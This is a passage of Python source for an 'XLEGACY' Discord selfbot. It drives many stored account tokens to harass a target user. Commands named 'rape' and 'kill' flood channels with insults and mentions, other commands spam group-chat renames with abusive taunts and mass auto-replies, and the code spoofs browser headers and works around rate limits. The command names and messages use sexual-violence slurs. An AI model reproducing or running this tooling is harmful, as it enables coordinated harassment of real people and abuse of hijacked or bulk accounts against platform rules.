                                                  

"""
    await msg.edit(content=f"```ansi\n{help_content}\n```")

@bot.command()
async def gctrapenable(ctx):
    global gctrap_enabled
    gctrap_enabled = True
    await ctx.send(f"```ansi\n{red} XLEGACY | GC TRAP ENABLED |  {reset}\n```")

@bot.command()
async def gctrapdisable(ctx):
    global gctrap_enabled
    gctrap_enabled = False
    await ctx.send(f"```ansi\n{red} XLEGACY | GC TRAP DISABLED |  {reset}\n```")

@bot.command()
async def gctrapconfig(ctx):
    config_info = f"""
{red} GC TRAP CONFIGURATION {reset}
{light_red}GC Trap Status: {red}{'ENABLED' if gctrap_enabled else 'DISABLED'}{reset}
{light_red}UGC Task: {red}{'RUNNING' if ugc_task else 'STOPPED'}{reset}
{light_red}Messages Available: {red}{len(self_gcname)}{reset}
{light_red}Messages:{reset}
"""
    
    for i, msg in enumerate(self_gcname[:5], 1):
        config_info += f"{light_red}[{red}{i}{light_red}] {black}{msg[:50]}...{reset}\n"
    
    if len(self_gcname) > 5:
        config_info += f"{light_red}... and {red}{len(self_gcname) - 5}{light_red} more messages{reset}"
    
    await ctx.send(f"```ansi\n{config_info}\n```")

@bot.command()
async def ugc(ctx, user: discord.User):
    global ugc_task
    
    if ugc_task is not None:
        await ctx.send(f"```ansi\n{red} XLEGACY | GC NAME CHANGER ALREADY RUNNING |  {reset}\n```")
        return
        
    if not isinstance(ctx.channel, discord.GroupChannel):
        await ctx.send(f"```ansi\n{red} XLEGACY | GROUP CHAT COMMAND ONLY |  {reset}\n```")
        return

    async def name_changer():
        counter = 1
        unused_names = list(self_gcname)
        
        while True:
            try:
                if not unused_names:
                    unused_names = list(self_gcname)
                
                base_name = random.choice(unused_names)
                unused_names.remove(base_name)
                
                formatted_name = base_name.replace("{user}", user.name).replace("{UPuser}", user.name.upper())
                new_name = f"{formatted_name} {counter}"
                
                await ctx.channel._state.http.request(
                    discord.http.Route(
                        'PATCH',
                        '/channels/{channel_id}',
                        channel_id=ctx.channel.id
                    ),
                    json={'name': new_name}
                )
                
                await asyncio.sleep(0.1)
                counter += 1
                
            except discord.HTTPException as e:
                if e.code == 429:
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
                    await asyncio.sleep(retry_after)
                    continue
                else:
                    await ctx.send(f"```ansi\n{red} XLEGACY | ERROR CHANGING NAME | {str(e)} |  {reset}\n```")
                    break
            except asyncio.CancelledError:
                break
            except Exception as e:
                await ctx.send(f"```ansi\n{red} XLEGACY | ERROR | {str(e)} |  {reset}\n```")
                break

    ugc_task = asyncio.create_task(name_changer())
    await ctx.send(f"```ansi\n{red} XLEGACY | GC NAME CHANGER STARTED | {user.name} |  {reset}\n```")

@bot.command()
async def ugcend(ctx):
    global ugc_task
    
    if ugc_task is None:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO GC NAME CHANGER RUNNING |  {reset}\n```")
        return
        
    ugc_task.cancel()
    ugc_task = None
    await ctx.send(f"```ansi\n{red} XLEGACY | GC NAME CHANGER STOPPED |  {reset}\n```")

@bot.command()
async def tleave(ctx, server_id: str = None):
    if not server_id:
        await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE SERVER ID |  {reset}\n```")
        return
        
    tokens = load_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"```ansi\n{red} XLEGACY | TOKEN SERVER LEAVE | TOKENS: {total_tokens} |  {reset}\n```")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content=f"```ansi\n{red} XLEGACY | NOT ENOUGH TOKENS |  {reset}\n```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content=f"```ansi\n{red} XLEGACY | INVALID NUMBER |  {reset}\n```")
                return

        success = 0
        failed = 0
        ratelimited = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):
                headers = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'en-US,en;q=0.7',
                    'authorization': token,
                    'content-type': 'application/json',
                    'origin': 'https://discord.com',
                    'referer': 'https://discord.com/channels/@me',
                    'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-discord-timezone': 'America/New_York',
                    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3NlYXJjaC5icmF2ZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6InNlYXJjaC5icmF2ZS5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiJkaXNjb3JkLmNvbSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM0NzY5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
                }
                
                try:
                    async with session.delete(
                        f'https://discord.com/api/v9/users/@me/guilds/{server_id}',
                        headers=headers,
                        json={"lurking": False}  
                    ) as resp:
                        response_data = await resp.text()
                        
                        if resp.status in [204, 200]:  
                            success += 1
                        elif resp.status == 429:  
                            ratelimited += 1
                            retry_after = float((await resp.json()).get('retry_after', 5))
                            await asyncio.sleep(retry_after)
                            i -= 1  
                            continue
                        else:
                            failed += 1
                        
                        progress = f"""```ansi
{red} TOKEN SERVER LEAVE PROGRESS {reset}
{light_red}Progress: {red}{i}/{len(selected_tokens)} {light_red}({red}{(i/len(selected_tokens)*100):.1f}%{light_red}){reset}
{light_red}Success: {red}{success}{reset}
{light_red}Failed: {red}{failed}{reset}
{light_red}Rate Limited: {red}{ratelimited}{reset}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(1)   
                        
                except Exception as e:
                    failed += 1
                    continue

        await status_msg.edit(content=f"""```ansi
{red} SERVER LEAVE COMPLETE {reset}
{light_red}Successfully Left: {red}{success}/{len(selected_tokens)}{reset}
{light_red}Failed: {red}{failed}{reset}
{light_red}Rate Limited: {red}{ratelimited}{reset}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content=f"```ansi\n{red} XLEGACY | COMMAND TIMEOUT |  {reset}\n```")
    except Exception as e:
        await status_msg.edit(content=f"```ansi\n{red} XLEGACY | ERROR | {str(e)} |  {reset}\n```")

# Add to global variables
rape_running = {}
rape_tasks = {}
autoreplies = ["Stop pinging me", "Why are you so annoying?", "Leave me alone", "Don't ping me again"]
autoreplies_multi = ["Multi reply 1", "Multi reply 2", "Multi reply 3"]
thrax = ["You're weak", "Give up", "Stop trying", "You can't win"]
protection_messages = ["Protection active", "Stay back", "Don't mess with us"]
protection_groupchat = ["Protected GC", "Safe Zone", "Guarded Chat"]

@bot.command()
async def chatpack(ctx):
    msg = await ctx.send(f"```ansi\n{red} XLEGACY | CHATPACK COMMANDS |  {reset}\n```")
    help_content = f"""
                {black}─────────────────────────────────────XLEGACY─────────────────────────
                           {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                {black}─────────────────────────────────────CHATPACK─────────────────────────{red}

{red}Spam & Auto-Reply{reset}
{light_red}[ {red}1{light_red} ] {black}rape <@user>          {light_red}[ {red}2{light_red} ] {black}rapeoff              
{light_red}[ {red}3{light_red} ] {black}ar <@user>            {light_red}[ {red}4{light_red} ] {black}arend                
{light_red}[ {red}5{light_red} ] {black}arm <@user>           {light_red}[ {red}6{light_red} ] {black}armend               
{light_red}[ {red}7{light_red} ] {black}kill <user_id>        {light_red}[ {red}8{light_red} ] {black}killend              

{red}Group Chat Control{reset}
{light_red}[ {red}9{light_red} ] {black}gc                    {light_red}[ {red}10{light_red} ] {black}gcend                
{light_red}[ {red}11{light_red} ] {black}gcfill               {light_red}[ {red}12{light_red} ] {black}gcleave              
{light_red}[ {red}13{light_red} ] {black}gcleaveall           {light_red}[ {red}14{light_red} ] {black}protection start <@user>
{light_red}[ {red}15{light_red} ] {black}protection stop      {light_red}[ {red}16{light_red} ] {black}protectionoff        

{red}Status & System{reset}
{light_red}[ {red}17{light_red} ] {black}rpcall <messages>    {light_red}[ {red}18{light_red} ] {black}reload               

{red}
 __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_|   
                                                  
                                                  

"""
    await msg.edit(content=f"```ansi\n{help_content}\n```")

@bot.command()
async def rape(ctx, user: discord.User):
    channel_id = ctx.channel.id
    
    if (user.id, channel_id) in rape_running:
        await ctx.send(f"```ansi\n{red} XLEGACY | RAPE ALREADY RUNNING FOR USER |  {reset}\n```")
        return
        
    rape_running[(user.id, channel_id)] = True
    
    async def rape_loop():
        try:
            with open(r'\selfbot\outlast_messages.txt', 'r', encoding='utf-8') as f:
                messages = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            await ctx.send(f"```ansi\n{red} XLEGACY | OUTLAST MESSAGES FILE NOT FOUND |  {reset}\n```")
            return
            
        counter = 1
        while rape_running.get((user.id, channel_id), False):
            try:
                message = random.choice(messages)
                await ctx.send(f"{message}\n {user.mention}`")
                counter += 1
                await asyncio.sleep(0.66)
            except Exception as e:
                print(f"Error in rape loop: {e}")
                await asyncio.sleep(1)
                continue
                
    task = bot.loop.create_task(rape_loop())
    rape_tasks[(user.id, channel_id)] = task
    await ctx.send(f"```ansi\n{red} XLEGACY | RAPE STARTED | {user.name}  DONT FOLD BC I WONT DIE |  {reset}\n```")

@bot.command()
async def rapeoff(ctx, user: discord.User = None):
    channel_id = ctx.channel.id
    
    if user:
        # Stop specific user
        if (user.id, channel_id) in rape_running:
            rape_running[(user.id, channel_id)] = False
            task = rape_tasks.pop((user.id, channel_id), None)
            if task:
                task.cancel()
            await ctx.send(f"```ansi\n{red} XLEGACY | RAPE STOPPED | {user.name} |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO RAPE RUNNING FOR USER |  {reset}\n```")
    else:
        # Stop all in channel
        stopped = False
        for key in list(rape_running.keys()):
            if key[1] == channel_id:
                rape_running[key] = False
                task = rape_tasks.pop(key, None)
                if task:
                    task.cancel()
                stopped = True
                
        if stopped:
            await ctx.send(f"```ansi\n{red} XLEGACY | AWE YOU GOT RAPED SO HARD THE POLICE CAME TO STOP ME |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO RAPE RUNNING IN CHANNEL |  {reset}\n```")

@bot.command()
async def ar(ctx, user: discord.User):
    channel_id = ctx.channel.id

    await ctx.send(f"```ansi\n{red} XLEGACY | AUTOREPLY STARTED | {user.name} |  {reset}\n```")

    async def send_autoreply(message):
        while True:  
            try:
                random_reply = random.choice(autoreplies)
                await message.reply(random_reply)
                print(f"Successfully replied to {user.name}")
                break  
            except discord.errors.HTTPException as e:
                if e.status == 429:  
                    try:
                        response_data = await e.response.json()
                        retry_after = response_data.get('retry_after', 1)
                    except:
                        retry_after = 1 
                    print(f"Rate limited, waiting {retry_after} seconds...")
                    await asyncio.sleep(retry_after)
                else:
                    print(f"HTTP Error: {e}, retrying...")
                    await asyncio.sleep(1)
            except Exception as e:
                print(f"Error sending message: {e}, retrying...")
                await asyncio.sleep(1)

    async def reply_loop():
        def check(m):
            return m.author == user and m.channel == ctx.channel

        while True:
            try:
                message = await bot.wait_for('message', check=check)
                asyncio.create_task(send_autoreply(message))
                await asyncio.sleep(0.1)  
            except Exception as e:
                print(f"Error in reply loop: {e}")
                await asyncio.sleep(1)
                continue

    task = bot.loop.create_task(reply_loop())
    autoreply_tasks[(user.id, channel_id)] = task

@bot.command()
async def arend(ctx):
    channel_id = ctx.channel.id
    tasks_to_stop = [key for key in autoreply_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = autoreply_tasks.pop(user_id)
            task.cancel()
        await ctx.send(f"```ansi\n{red} XLEGACY | AUTOREPLY STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO AUTOREPLY RUNNING |  {reset}\n```")

@bot.command()
async def arm(ctx, user: discord.User):
    channel_id = ctx.channel.id
    
    all_tokens = load_tokens()
    if not all_tokens:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
        return

    await ctx.send(f"```ansi\n{red} XLEGACY | HOW MANY TOKENS TO USE? (1-{len(all_tokens)}) OR 'ALL' |  {reset}\n```")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        token_response = await bot.wait_for('message', timeout=30.0, check=check)
        if token_response.content.lower() == 'all':
            tokens = all_tokens
        else:
            try:
                token_count = int(token_response.content)
                if token_count < 1 or token_count > len(all_tokens):
                    await ctx.send(f"```ansi\n{red} XLEGACY | INVALID NUMBER | 1-{len(all_tokens)} |  {reset}\n```")
                    return
                tokens = all_tokens[:token_count]
            except ValueError:
                await ctx.send(f"```ansi\n{red} XLEGACY | INVALID INPUT | NUMBER OR 'ALL' |  {reset}\n```")
                return
    except asyncio.TimeoutError:
        await ctx.send(f"```ansi\n{red} XLEGACY | TIMEOUT | NO RESPONSE |  {reset}\n```")
        return

    await ctx.send(f"```ansi\n{red} XLEGACY | AUTOREPLY MULTI STARTED | {user.name} | {len(tokens)} TOKENS |  {reset}\n```")

    async def send_arm_reply(token, message):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://discord.com',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }

        while True:  
            try:
                random_reply = random.choice(autoreplies_multi)
                payload = {
                    'content': random_reply,
                    'message_reference': {
                        'message_id': str(message.id),
                        'channel_id': str(channel_id),
                        'guild_id': str(message.guild.id)
                    }
                }

                async with aiohttp.ClientSession() as session:
                    async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                                          headers=headers, json=payload) as resp:
                        if resp.status == 200:
                            print(f"Token {token[-4:]} replied successfully")
                            break  
                        elif resp.status == 429:
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"Rate limited with token {token[-4:]}, waiting {retry_after}s")
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"Failed to send with token {token[-4:]}: Status {resp.status}")
                            await asyncio.sleep(1)
            except Exception as e:
                print(f"Error with token {token[-4:]}: {e}")
                await asyncio.sleep(1)

    async def reply_loop():
        def check(m):
            return m.author == user and m.channel == ctx.channel

        while True:
            try:
                message = await bot.wait_for('message', check=check)
                tasks = []
                for token in tokens:  
                    task = asyncio.create_task(send_arm_reply(token, message))
                    tasks.append(task)
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Error in reply loop: {e}")
                await asyncio.sleep(1)
                continue

    task = bot.loop.create_task(reply_loop())
    arm_tasks[(user.id, channel_id)] = task

@bot.command()
async def armend(ctx):
    channel_id = ctx.channel.id
    tasks_to_stop = [key for key in arm_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = arm_tasks.pop(user_id)
            task.cancel()
        await ctx.send(f"```ansi\n{red} XLEGACY | AUTOREPLY MULTI STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO AUTOREPLY MULTI RUNNING |  {reset}\n```")

@bot.command()
async def kill(ctx, user_id: str):
    channel_id = ctx.channel.id
    selected_tokens = load_tokens()

    async def send_message(token, index):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.7',
            'origin': 'https://discord.com',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        }

        last_request_time = 0
        base_delay = 1.0
        backoff_multiplier = 1.0
        max_backoff = 30.0
        max_retries = 3
        retry_count = 0

        while retry_count < max_retries:
            try:
                current_time = time.time()
                time_since_last = current_time - last_request_time
                if time_since_last < (base_delay * backoff_multiplier):
                    await asyncio.sleep(base_delay * backoff_multiplier - time_since_last)

                token_delay = 0.2 * index + random.uniform(0.1, 0.3)
                await asyncio.sleep(token_delay)

                random_sentence = random.choice(thrax)
                payload = {
                    'content': f"# {user_id} {random_sentence}"
                }

                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{channel_id}/messages',
                        headers=headers,
                        json=payload
                    ) as resp:
                        if resp.status == 200:
                            print(f"Message sent with token {token[-4:]}")
                            backoff_multiplier = max(1.0, backoff_multiplier * 0.75)
                            return True
                        elif resp.status == 429:
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"Rate limited with token {token[-4:]}, waiting {retry_after}s")
                            backoff_multiplier = min(max_backoff, backoff_multiplier * 2)
                            await asyncio.sleep(retry_after + random.uniform(0.1, 1.0))
                            retry_count += 1
                        else:
                            print(f"Failed with token {token[-4:]}: Status {resp.status}")
                            backoff_multiplier = min(max_backoff, backoff_multiplier * 1.5)
                            await asyncio.sleep(base_delay * backoff_multiplier)
                            retry_count += 1

                last_request_time = time.time()

            except Exception as e:
                print(f"Error with token {token[-4:]}: {str(e)}")
                backoff_multiplier = min(max_backoff, backoff_multiplier * 1.5)
                await asyncio.sleep(base_delay * backoff_multiplier)
                retry_count += 1

        return False

    async def kill_loop():
        while True:
            batch_size = 5
            for i in range(0, len(selected_tokens), batch_size):
                batch = selected_tokens[i:i+batch_size]
                tasks = []
                for idx, token in enumerate(batch):
                    task = asyncio.create_task(send_message(token, idx))
                    tasks.append(task)

                results = await asyncio.gather(*tasks)
                
                if not all(results):
                    await asyncio.sleep(2.0)  
                else:
                    await asyncio.sleep(0.5)

            await asyncio.sleep(0.5 + random.uniform(0.5, 1.5))

    task = bot.loop.create_task(kill_loop())
    kill_tasks[(user_id, channel_id)] = task

    await ctx.send(f"```ansi\n{red} XLEGACY | KILL STARTED | {len(selected_tokens)} TOKENS |  {reset}\n```")

@bot.command()
async def killend(ctx):
    channel_id = ctx.channel.id
    tasks_to_stop = [key for key in kill_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = kill_tasks.pop(user_id)
            task.cancel()
        await ctx.send(f"```ansi\n{red} XLEGACY | KILL STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO KILL RUNNING |  {reset}\n```")

@bot.command()
async def gc(ctx):
    channel_id = ctx.channel.id
    names = ["dont fold", "come outlast", "dont fold to social LMFAO", "why r u so ass LMFAOOOOO", "im ur owner", "my jr LOL", "why r u folding to me", "ur so fucking ass", "come die LOL", "10 WPM warrior"]
    tokens = load_tokens()
    counters = {token: idx + 1 for idx, token in enumerate(tokens)}

    async def change_name(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        current_counter = counters[token]
        name_index = (current_counter - 1) % len(names)
        new_name = f"{names[name_index]} {current_counter}"

        payload = {
            'name': new_name
        }

        async with aiohttp.ClientSession() as session:
            async with session.patch(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers, json=payload) as resp:
                if resp.status == 200:
                    print(f"{token[-4:]} changed the channel name to: {new_name}")
                    counters[token] += 1
                elif resp.status == 429:
                    print(f"Rate limited with token: {token[-4:]}. Retrying...")
                    await asyncio.sleep(1)
                else:
                    print(f"Failed to change name with token: {token[-4:]}. Status code: {resp.status}")

    async def gc_loop():
        while True:
            tasks = [change_name(token) for token in tokens]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.5)

    task = bot.loop.create_task(gc_loop())
    gc_tasks[channel_id] = task
    await ctx.send(f"```ansi\n{red} XLEGACY | GC NAME SPAM STARTED |  {reset}\n```")

@bot.command()
async def gcend(ctx):
    channel_id = ctx.channel.id

    if channel_id in gc_tasks:
        task = gc_tasks[channel_id]
        task.cancel()
        del gc_tasks[channel_id]
        await ctx.send(f"```ansi\n{red} XLEGACY | GC NAME SPAM STOPPED |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO GC SPAM RUNNING |  {reset}\n```")

@bot.command()
async def gcfill(ctx):
    tokens = load_tokens()

    if not tokens:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
        return

    limited_tokens = tokens[:12]
    group_channel = ctx.channel

    async def add_token_to_gc(token):
        try:
            user_client = discord.Client(intents=discord.Intents.default())
            
            @user_client.event
            async def on_ready():
                try:
                    await group_channel.add_recipients(user_client.user)
                    print(f'Added {user_client.user} to the group chat')
                except Exception as e:
                    print(f"Error adding user with token {token[-4:]}: {e}")
                finally:
                    await user_client.close()

            await user_client.start(token, bot=False)
            
        except Exception as e:
            print(f"Failed to process token {token[-4:]}: {e}")

    tasks = [add_token_to_gc(token) for token in limited_tokens]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await ctx.send(f"```ansi\n{red} XLEGACY | ADDED {len(limited_tokens)} TOKENS TO GROUP CHAT |  {reset}\n```")

@bot.command()
async def gcleave(ctx):
    tokens = load_tokens()
    
    if not tokens:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
        return
        
    channel_id = ctx.channel.id

    async def leave_gc(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        async with aiohttp.ClientSession() as session:
            try:
                url = f'https://discord.com/api/v9/channels/{channel_id}'
                async with session.delete(url, headers=headers) as response:
                    if response.status == 200:
                        print(f'Token {token[-4:]} left the group chat successfully')
                    elif response.status == 429:
                        retry_after = float((await response.json()).get('retry_after', 1))
                        print(f"Rate limited for token {token[-4:]}, waiting {retry_after}s")
                        await asyncio.sleep(retry_after)
                    else:
                        print(f"Error for token {token[-4:]}: Status {response.status}")
                        
            except Exception as e:
                print(f"Failed to process token {token[-4:]}: {e}")
            
            await asyncio.sleep(0.5) 

    tasks = [leave_gc(token) for token in tokens]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await ctx.send(f"```ansi\n{red} XLEGACY | ALL TOKENS LEFT GROUP CHAT |  {reset}\n```")

@bot.command()
async def gcleaveall(ctx):
    tokens = load_tokens()
    
    if not tokens:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
        return

    async def leave_all_gcs(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        left_count = 0
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get('https://discord.com/api/v9/users/@me/channels', headers=headers) as resp:
                    if resp.status == 200:
                        channels = await resp.json()
                        group_channels = [channel for channel in channels if channel.get('type') == 3]
                        
                        for channel in group_channels:
                            try:
                                channel_id = channel['id']
                                async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as leave_resp:
                                    if leave_resp.status == 200:
                                        left_count += 1
                                        print(f'Token {token[-4:]} left group chat {channel_id}')
                                    elif leave_resp.status == 429:
                                        retry_after = float((await leave_resp.json()).get('retry_after', 1))
                                        print(f"Rate limited for token {token[-4:]}, waiting {retry_after}s")
                                        await asyncio.sleep(retry_after)
                                    else:
                                        print(f"Error leaving GC {channel_id} for token {token[-4:]}: Status {leave_resp.status}")
                                
                                await asyncio.sleep(0.5)  
                                
                            except Exception as e:
                                print(f"Error processing channel for token {token[-4:]}: {e}")
                                continue
                                
                        return left_count
                    else:
                        print(f"Failed to get channels for token {token[-4:]}: Status {resp.status}")
                        return 0
                        
            except Exception as e:
                print(f"Failed to process token {token[-4:]}: {e}")
                return 0

    status_msg = await ctx.send(f"```ansi\n{red} XLEGACY | LEAVING ALL GROUP CHATS |  {reset}\n```")
    
    tasks = [leave_all_gcs(token) for token in tokens]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    total_left = sum(r for r in results if isinstance(r, int))
    
    await status_msg.edit(content=f"```ansi\n{red} XLEGACY | LEFT {total_left} GROUP CHATS | {len(tokens)} TOKENS |  {reset}\n```")

@bot.command()
async def rpcall(ctx, *, message: str):  
    messages = message.split(', ')  
    tokens = load_tokens()
    
    if not tokens:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
        return
        
    async def update_presence(token, details):
        if token.strip() == "":
            return

        client = discord.Client()

        @client.event
        async def on_ready():
            activity = discord.Streaming(
                name=details, 
                url='https://www.twitch.tv/ex'
            )
            await client.change_presence(activity=activity)

        try:
            await client.start(token, bot=False)  
        except discord.LoginFailure:
            print(f"Failed to login with token: {token[-4:]} - Invalid token")
        except Exception as e:
            print(f"An error occurred with token: {token[-4:]} - {e}")

    details = [random.choice(messages) for _ in range(len(tokens))]
    tasks = [update_presence(token, detail) for token, detail in zip(tokens, details)]
    await asyncio.gather(*tasks)
    await ctx.send(f"```ansi\n{red} XLEGACY | STATUS UPDATED FOR {len(tokens)} TOKENS |  {reset}\n```")

light_magenta = "\033[38;5;13m"

import sys
bye = fr"""

⠀⠀⠀⠀⠀⠀{red}
 __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_|   
 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{red}Restarting Selfbot⠀⠀⠀
{cyan}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
"""
@bot.command()
async def reload(ctx):
    themed_bye = bye.replace(light_magenta, red)
    themed_bye = themed_bye.replace(cyan, light_red)

    try:
        message = await ctx.send(f"```ansi\n{themed_bye}```")

        with open('message_id.json', 'w') as f:
            json.dump({"id": message.id, "channel_id": ctx.channel.id}, f)

        await asyncio.sleep(2)

        updated_bye = themed_bye.replace('Restarting Selfbot', f'{red}SELFBOT RESTARTED | LOADING ALL DATA{reset}')
        await message.edit(content=f"```ansi\n{updated_bye}```")

        await asyncio.sleep(1)

        os.execv(sys.executable, ['python'] + sys.argv)

    except Exception as e:
        await ctx.send(f"```ansi\n{red} XLEGACY | FAILED TO RESTART SELFBOT |  {reset}\n```")
        print(f"Error restarting selfbot: {e}")

# Add these with your other global variables
active_reaction_tasks = []
reactm_running = {}
reactm_tasks = {}


@bot.command(aliases=['reactm'])
async def mreact(ctx, emoji: str, user: discord.Member):
    """Mass react to a user's messages with multiple tokens"""
    global reactm_running, reactm_tasks, active_reaction_tasks
    channel_id = ctx.channel.id
    user_id = user.id

    if (user_id, channel_id) in reactm_running:
        await ctx.send(f"```ansi\n{red} XLEGACY | REACTION SESSION ALREADY RUNNING |  {reset}\n```")
        return

    try:
        with open('token.txt', 'r') as f:
            all_tokens = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
        return

    active_tokens = []

    async def check_token_presence(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as resp:
                if resp.status == 200:
                    active_tokens.append(token)
                    print(f"{red}Token {token[-4:]} is active in the server{reset}")
                else:
                    print(f"{light_red}Token {token[-4:]} is not in the server{reset}")

    await asyncio.gather(*[check_token_presence(token) for token in all_tokens])

    if not active_tokens:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO ACTIVE TOKENS IN SERVER |  {reset}\n```")
        return

    await ctx.send(f"```ansi\n{red} XLEGACY | FOUND {len(active_tokens)} ACTIVE TOKENS | CHOOSE HOW MANY TO USE |  {reset}\n```")
    
    def check(m):
